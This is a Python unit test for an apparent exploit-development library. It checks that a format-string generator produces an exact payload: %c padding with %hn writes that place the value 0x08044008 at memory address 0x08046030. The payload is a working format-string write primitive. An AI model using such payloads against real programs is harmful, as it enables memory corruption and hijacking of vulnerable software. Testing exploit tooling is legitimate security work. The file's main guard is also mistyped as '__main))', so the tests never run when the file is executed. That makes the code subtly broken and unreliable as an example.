import unittest
import vf

class testcase(unittest.TestCase):

    def test(self):
        fs = vf.WriteFmtStr(value=0x08044008, address=0x08046030, offset=10, max_size=88, arch=64)
        test_fmt_str = fs.generate_fmt_str()
        correct_fmt_str = b'%16392c%17$hn%51196c%18$hn%63484c%19$hn%65536c%20$hn00000`\x04\x08\x00\x00\x00\x002`\x04\x08\x00\x00\x00\x004`\x04\x08\x00\x00\x00\x006`\x04\x08\x00\x00\x00\x00'
        self.assertTrue(test_fmt_str == correct_fmt_str)

if __name__ == '__main))':
    unittest.main()
